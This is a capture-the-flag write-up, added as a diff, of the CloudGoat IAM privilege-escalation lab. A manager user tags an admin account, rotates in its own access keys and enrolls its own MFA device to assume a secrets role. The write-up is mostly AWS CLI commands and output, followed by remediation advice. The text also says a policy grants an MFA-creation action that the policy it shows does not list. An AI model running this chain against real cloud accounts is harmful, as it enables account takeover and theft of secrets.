@@ -1,0 +1,480 @@
+# 🥷 CloudGoat: IAM Privesc by Key Rotation
+
+_Write-up: Escalating from a manager account to secrets access by weaponizing self-service key management_
+
+## 🧭 Overview
+
+**Scenario:** `iam_privesc_by_key_rotation` \
+**Platform:** [CloudGoat (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/cloudgoat) \
+**Tools:** AWS CLI + a TOTP authenticator app \
+**Objective:** Starting as a low-privileged `manager` user, escalate to read the secret stored in AWS Secrets Manager that only an assumable role is allowed to view.
+
+## ⚔️ Attack Path Summary
+
+Manager (self-manage + tag) → Tag `admin` as `developer=true` → Rotate `admin` access keys → Log in as `admin` → Enroll a virtual MFA device → Assume the secrets role with MFA → Read the secret
+
+## 🔑 Phase 1: Initial Access
+
+#### Configure Profile
+
+```bash
+aws configure --profile cloudgoat
+# Access Key: AKIA****************
+# Secret Key: yy8aBayfcjg/BllBra2ZPcxX78Hn1********************
+```
+
+#### Validate Credentials
+
+```bash
+aws sts get-caller-identity --profile cloudgoat
+```
+
+```json
+{
+  "UserId": "AIDA****************",
+  "Account": "7912********",
+  "Arn": "arn:aws:iam::7912********:user/manager_cgid59sh0puk7n"
+}
+```
+
+We land as `manager`. The first job is to map the identities and permissions around us.
+
+## 🗺️ Phase 2: Enumerate the Account
+
+#### List Users
+
+```bash
+aws iam list-users --profile cloudgoat
+```
+
+```json
+{
+  "Users": [
+    { "UserName": "admin_cgid59sh0puk7n",     "Arn": "arn:aws:iam::7912********:user/admin_cgid59sh0puk7n" },
+    { "UserName": "developer_cgid59sh0puk7n", "Arn": "arn:aws:iam::7912********:user/developer_cgid59sh0puk7n" },
+    { "UserName": "manager_cgid59sh0puk7n",   "Arn": "arn:aws:iam::7912********:user/manager_cgid59sh0puk7n" }
+  ]
+}
+```
+
+Three users: `admin`, `developer`, and us (`manager`).
+
+#### Find the Target Role
+
+```bash
+aws iam list-roles --profile cloudgoat
+# → cg_secretsmanager_cgid59sh0puk7n
+
+aws iam get-role --role-name cg_secretsmanager_cgid59sh0puk7n --profile cloudgoat
+```
+
+```json
+{
+  "Role": {
+    "RoleName": "cg_secretsmanager_cgid59sh0puk7n",
+    "Arn": "arn:aws:iam::7912********:role/cg_secretsmanager_cgid59sh0puk7n",
+    "Description": "Access to view secrets",
+    "AssumeRolePolicyDocument": {
+      "Version": "2012-10-17",
+      "Statement": [
+        {
+          "Effect": "Allow",
+          "Principal": { "AWS": "arn:aws:iam::7912********:root" },
+          "Action": "sts:AssumeRole",
+          "Condition": { "Bool": { "aws:MultiFactorAuthPresent": "true" } }
+        }
+      ]
+    }
+  }
+}
+```
+
+#### Key Finding
+
+The `cg_secretsmanager` role can view secrets, and its trust policy allows any principal in the account to assume it — **but only with MFA present** (`aws:MultiFactorAuthPresent: true`). MFA is the gate we will eventually have to satisfy.
+
+The role's attached policy confirms what it unlocks:
+
+```bash
+aws iam list-attached-role-policies --role-name cg_secretsmanager_cgid59sh0puk7n --profile cloudgoat
+aws iam get-policy-version \
+  --policy-arn arn:aws:iam::7912********:policy/cg_view_secrets_cgid59sh0puk7n \
+  --version-id v1 --profile cloudgoat
+```
+
+```json
+{
+  "PolicyVersion": {
+    "Document": {
+      "Version": "2012-10-17",
+      "Statement": [
+        { "Effect": "Allow", "Action": "secretsmanager:ListSecrets",   "Resource": "*" },
+        { "Effect": "Allow", "Action": "secretsmanager:GetSecretValue", "Resource": "arn:aws:secretsmanager:us-east-1:7912********:secret:cg_secret_cgid59sh0puk7n-vQSnFf" }
+      ]
+    }
+  }
+}
+```
+
+## 🧩 Phase 3: Map Each User's Permissions
+
+Now we walk every user's inline and attached policies to find a path to that role.
+
+#### Manager (us)
+
+```bash
+aws iam list-attached-user-policies --user-name manager_cgid59sh0puk7n --profile cloudgoat
+# → IAMReadOnlyAccess
+aws iam list-user-policies --user-name manager_cgid59sh0puk7n --profile cloudgoat
+# → SelfManageAccess, TagResources
+```
+
+**`SelfManageAccess`** is the crown jewel — but read the condition carefully:
+
+```json
+{
+  "Action": [
+    "iam:DeactivateMFADevice", "iam:GetMFADevice", "iam:EnableMFADevice",
+    "iam:ResyncMFADevice", "iam:DeleteAccessKey", "iam:UpdateAccessKey",
+    "iam:CreateAccessKey"
+  ],
+  "Condition": { "StringEquals": { "aws:ResourceTag/developer": "true" } },
+  "Effect": "Allow",
+  "Resource": [
+    "arn:aws:iam::7912********:user/*",
+    "arn:aws:iam::7912********:mfa/*"
+  ],
+  "Sid": "SelfManageAccess"
+}
+```
+
+We can manage access keys **and MFA devices** for *any user* — provided that user carries the tag `developer=true`.
+
+**`TagResources`** hands us exactly the missing ingredient:
+
+```json
+{
+  "Action": [
+    "iam:TagUser", "iam:UntagUser", "iam:TagRole", "iam:UntagRole",
+    "iam:TagPolicy", "iam:UntagPolicy", "iam:TagMFADevice", "iam:UntagMFADevice"
+  ],
+  "Effect": "Allow",
+  "Resource": "*",
+  "Sid": "TagResources"
+}
+```
+
+We can apply the `developer=true` tag to whomever we like. The condition on `SelfManageAccess` is one we control.
+
+#### Developer
+
+```bash
+aws iam list-user-policies --user-name developer_cgid59sh0puk7n --profile cloudgoat
+# → DeveloperViewSecrets  (secretsmanager:ListSecrets only — a dead end for GetSecretValue)
+```
+
+#### Admin
+
+```bash
+aws iam list-user-policies --user-name admin_cgid59sh0puk7n --profile cloudgoat
+# → AssumeRoles
+aws iam get-user-policy --user-name admin_cgid59sh0puk7n --policy-name AssumeRoles --profile cloudgoat
+```
+
+```json
+{
+  "PolicyDocument": {
+    "Statement": [
+      {
+        "Action": "sts:AssumeRole",
+        "Effect": "Allow",
+        "Resource": "arn:aws:iam::7912********:role/cg_secretsmanager_cgid59sh0puk7n",
+        "Sid": "AssumeRole"
+      }
+    ]
+  }
+}
+```
+
+**There it is.** The `admin` user is the only identity permitted to assume the secrets role. We can't assume it ourselves — but we *can* manipulate `admin`'s credentials, because `SelfManageAccess` works on any user we tag.
+
+## 🧨 Phase 4: The Privesc Chain
+
+The plan:
+
+1. Tag `admin` with `developer=true` so `SelfManageAccess` applies to it.
+2. Delete `admin`'s existing (inactive) access keys to free a slot.
+3. Mint a fresh access key for `admin` — credentials we now control.
+4. Log in as `admin`, enroll our own virtual MFA device.
+5. Assume the secrets role with that MFA and read the flag.
+
+#### Step 1 — Tag the admin as a developer
+
+```bash
+aws iam tag-user --user-name admin_cgid59sh0puk7n \
+  --tags '[{"Key":"developer","Value":"true"}]' --profile cloudgoat
+```
+
+#### Step 2 — Clear the access-key slots
+
+IAM caps a user at two access keys, and `admin` already has two (both `Inactive`). Delete them to make room.
+
+```bash
+aws iam list-access-keys --user-name admin_cgid59sh0puk7n --profile cloudgoat
+```
+
+```json
+{
+  "AccessKeyMetadata": [
+    { "AccessKeyId": "AKIA************5IQWUKMF", "Status": "Inactive" },
+    { "AccessKeyId": "AKIA************WBGMBR7E", "Status": "Inactive" }
+  ]
+}
+```
+
+```bash
+aws iam delete-access-key --user-name admin_cgid59sh0puk7n \
+  --access-key-id AKIA************5IQWUKMF --profile cloudgoat
+aws iam delete-access-key --user-name admin_cgid59sh0puk7n \
+  --access-key-id AKIA************WBGMBR7E --profile cloudgoat
+```
+
+#### Step 3 — Rotate in a key we own
+
+```bash
+aws iam create-access-key --user-name admin_cgid59sh0puk7n --profile cloudgoat
+```
+
+```json
+{
+  "AccessKey": {
+    "UserName": "admin_cgid59sh0puk7n",
+    "AccessKeyId": "AKIA****************",
+    "SecretAccessKey": "26rsIBhLWEJrxKBQJTwOK5QgaBThD6R********",
+    "Status": "Active"
+  }
+}
+```
+
+This is the "key rotation" the scenario is named for — we didn't guess `admin`'s password or find a leaked key. We *issued ourselves* a valid one.
+
+```bash
+aws configure --profile cg-admin   # paste the new key pair
+aws sts get-caller-identity --profile cg-admin
+```
+
+```json
+{
+  "UserId": "AIDA****************",
+  "Account": "7912********",
+  "Arn": "arn:aws:iam::7912********:user/admin_cgid59sh0puk7n"
+}
+```
+
+We are now `admin`.
+
+## 🔐 Phase 5: Satisfy the MFA Gate
+
+The role's trust policy demands `aws:MultiFactorAuthPresent: true`. `admin` has no MFA device — so we enroll one. `SelfManageAccess` already granted us `iam:CreateVirtualMFADevice` and `iam:EnableMFADevice`.
+
+#### Create a Virtual MFA Device
+
+```bash
+aws iam create-virtual-mfa-device \
+  --virtual-mfa-device-name cloudgoat-mfa \
+  --bootstrap-method QRCodePNG \
+  --outfile ~/cloudgoat-mfa.png \
+  --profile cg-admin
+```
+
+```json
+{
+  "VirtualMFADevice": {
+    "SerialNumber": "arn:aws:iam::7912********:mfa/cloudgoat-mfa"
+  }
+}
+```
+
+Scan `cloudgoat-mfa.png` with any TOTP authenticator (Authy, Google Authenticator, 1Password). Enrolling requires two *consecutive* codes to prove the seed synced:
+
+```bash
+aws iam enable-mfa-device \
+  --user-name admin_cgid59sh0puk7n \
+  --serial-number arn:aws:iam::7912********:mfa/cloudgoat-mfa \
+  --authentication-code1 730646 \
+  --authentication-code2 343671 \
+  --profile cg-admin
+```
+
+## 🎭 Phase 6: Assume the Role with MFA → Flag
+
+With MFA enrolled, feed a fresh TOTP code into `sts assume-role`:
+
+```bash
+aws sts assume-role \
+  --role-arn arn:aws:iam::7912********:role/cg_secretsmanager_cgid59sh0puk7n \
+  --role-session-name admin-session \
+  --serial-number arn:aws:iam::7912********:mfa/cloudgoat-mfa \
+  --token-code 280134 \
+  --profile cg-admin
+```
+
+```json
+{
+  "Credentials": {
+    "AccessKeyId": "ASIA****************",
+    "SecretAccessKey": "z5pr0G8U+ffZhJdqfeNUmzUCCs4j+uPG********",
+    "SessionToken": "FwoGZXIvYXdzEPn//////////wEaD...********",
+    "Expiration": "2026-08-11T08:52:37+00:00"
+  },
+  "AssumedRoleUser": {
+    "Arn": "arn:aws:sts::7912********:assumed-role/cg_secretsmanager_cgid59sh0puk7n/admin-session"
+  }
+}
+```
+
+Drop those temporary credentials into a named profile in `~/.aws/credentials`:
+
+```ini
+[admin-view-secrets]
+aws_access_key_id     = ASIA****************
+aws_secret_access_key = z5pr0G8U+ffZhJdqfeNUmzUCCs4j+uPG********
+aws_session_token     = FwoGZXIvYXdzEPn//////////wEaD...********
+```
+
+#### List and Read the Secret
+
+```bash
+aws secretsmanager list-secrets --region us-east-1 --profile admin-view-secrets
+```
+
+```json
+{
+  "SecretList": [
+    {
+      "ARN": "arn:aws:secretsmanager:us-east-1:7912********:secret:cg_secret_cgid59sh0puk7n-vQSnFf",
+      "Name": "cg_secret_cgid59sh0puk7n",
+      "Description": "The primary secret for the iam_privesc_by_key_rotation scenario"
+    }
+  ]
+}
+```
+
+```bash
+aws secretsmanager get-secret-value \
+  --secret-id arn:aws:secretsmanager:us-east-1:7912********:secret:cg_secret_cgid59sh0puk7n-vQSnFf \
+  --region us-east-1 --profile admin-view-secrets
+```
+
+```json
+{
+  "Name": "cg_secret_cgid59sh0puk7n",
+  "SecretString": "flag{14m_PERM15510N5_4Re_5C4R_...}",
+  "VersionStages": ["AWSCURRENT"]
+}
+```
+
+🚩 **Flag:** `flag{14m_PERM15510N5_4Re_5C4R_...}`
+
+## 📐 Attack Chain Diagram
+
+```
+┌────────────────────────────┐
+│  manager                   │
+│  SelfManageAccess + Tag    │
+└───────────┬────────────────┘
+            │ iam:TagUser  (developer=true on admin)
+            ▼
+┌────────────────────────────┐
+│  admin is now "developer"  │
+│  → SelfManageAccess applies│
+└───────────┬────────────────┘
+            │ delete-access-key ×2
+            │ create-access-key
+            ▼
+┌────────────────────────────┐
+│  admin credentials (ours)  │
+└───────────┬────────────────┘
+            │ create-virtual-mfa-device
+            │ enable-mfa-device
+            ▼
+┌────────────────────────────┐
+│  admin + MFA               │
+└───────────┬────────────────┘
+            │ sts:AssumeRole (+ MFA token)
+            ▼
+┌────────────────────────────┐
+│  cg_secretsmanager role    │
+│  GetSecretValue → FLAG     │
+└────────────────────────────┘
+```
+
+## 🚨 Weaknesses Demonstrated
+
+| # | Weakness | CWE |
+|---|----------|-----|
+| 1 | Permission condition keyed on a tag the same principal can set (`iam:TagUser` + `aws:ResourceTag/developer`) | CWE-269 |
+| 2 | Self-service access-key management (`iam:CreateAccessKey`/`DeleteAccessKey`) over `user/*` | CWE-732 |
+| 3 | Self-service MFA enrollment lets an attacker satisfy the MFA gate they were meant to be blocked by | CWE-284 |
+| 4 | Role trust policy trusts the whole account root, gated only by "any MFA present" | CWE-269 |
+
+## 💡 Remediation
+
+1. **Never gate a permission on a tag the grantee can write.** If `iam:TagUser` and a `aws:ResourceTag/*` condition live on the same principal, the condition is self-serviceable. Split tagging duties from key/MFA management, or scope tagging to a fixed resource set.
+2. **Scope self-management to `self`.** Access-key and MFA actions should target `arn:aws:iam::<acct>:user/${aws:username}`, not `user/*`. A manager should never be able to rotate another user's keys.
+3. **Don't let users enroll their own first MFA unsupervised** where MFA is the sole control protecting privileged role assumption. Bootstrap MFA out-of-band, or require an existing MFA to register a new one.
+4. **Tighten role trust.** Trust specific principals, not `:root`, and add conditions beyond `MultiFactorAuthPresent` (e.g. `aws:PrincipalTag`, source identity, external ID).
+5. **Alert on key rotation and MFA changes.** `DeleteAccessKey` + `CreateAccessKey` on another user, or a new `EnableMFADevice`, are high-signal CloudTrail events worth paging on.
+
+## 🎯 MITRE ATT&CK Mapping
+
+| Tactic | Technique | ID |
+|--------|-----------|-----|
+| Persistence | Account Manipulation: Additional Cloud Credentials | T1098.001 |
+| Privilege Escalation | Valid Accounts: Cloud Accounts | T1078.004 |
+| Defense Evasion | Modify Authentication Process: MFA | T1556.006 |
+| Credential Access | Unsecured Credentials: Cloud Secrets Management | T1552.007 |
+
+## 🛠️ Commands Reference
+
+```bash
+# Recon
+aws sts get-caller-identity --profile cloudgoat
+aws iam list-users --profile cloudgoat
+aws iam list-roles --profile cloudgoat
+aws iam get-role --role-name <role> --profile cloudgoat
+aws iam list-user-policies --user-name <user> --profile cloudgoat
+aws iam get-user-policy --user-name <user> --policy-name <name> --profile cloudgoat
+
+# Privesc — tag + key rotation
+aws iam tag-user --user-name <admin> --tags '[{"Key":"developer","Value":"true"}]' --profile cloudgoat
+aws iam list-access-keys --user-name <admin> --profile cloudgoat
+aws iam delete-access-key --user-name <admin> --access-key-id <id> --profile cloudgoat
+aws iam create-access-key --user-name <admin> --profile cloudgoat
+
+# MFA enrollment
+aws iam create-virtual-mfa-device --virtual-mfa-device-name <name> \
+  --bootstrap-method QRCodePNG --outfile <file>.png --profile cg-admin
+aws iam enable-mfa-device --user-name <admin> --serial-number <arn> \
+  --authentication-code1 <code1> --authentication-code2 <code2> --profile cg-admin
+
+# Assume role + read secret
+aws sts assume-role --role-arn <role-arn> --role-session-name s1 \
+  --serial-number <mfa-arn> --token-code <code> --profile cg-admin
+aws secretsmanager list-secrets --region us-east-1 --profile admin-view-secrets
+aws secretsmanager get-secret-value --secret-id <arn> --region us-east-1 --profile admin-view-secrets
+```
+
+## 📚 Additional Resources
+
+- [AWS IAM CLI Reference](https://docs.aws.amazon.com/cli/latest/reference/iam/)
+- [Using MFA with the AWS CLI / AssumeRole](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_mfa_configure-api-require.html)
+- [IAM Best Practices](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html)
+- [CloudGoat iam_privesc_by_key_rotation scenario](https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/cloudgoat/scenarios/aws/iam_privesc_by_key_rotation)
+
+## 🎓 Key Takeaways
+
+1. **A condition is only as strong as who can satisfy it.** Gating a permission on `developer=true` is meaningless when the same principal holds `iam:TagUser`. Attacker-controllable conditions are no condition at all.
+2. **Key rotation is a privesc primitive.** The right to create and delete another user's access keys is functionally the right to *become* that user — no password, no leaked secret required.
+3. **MFA isn't a control if the target enrolls it.** Self-service MFA registration lets an attacker check the `MultiFactorAuthPresent` box themselves, turning the gate into a formality.
+4. **Chain the small grants.** Tagging, key management, and MFA enrollment are each unremarkable alone — combined, they walk a low-priv manager straight into the secrets vault.
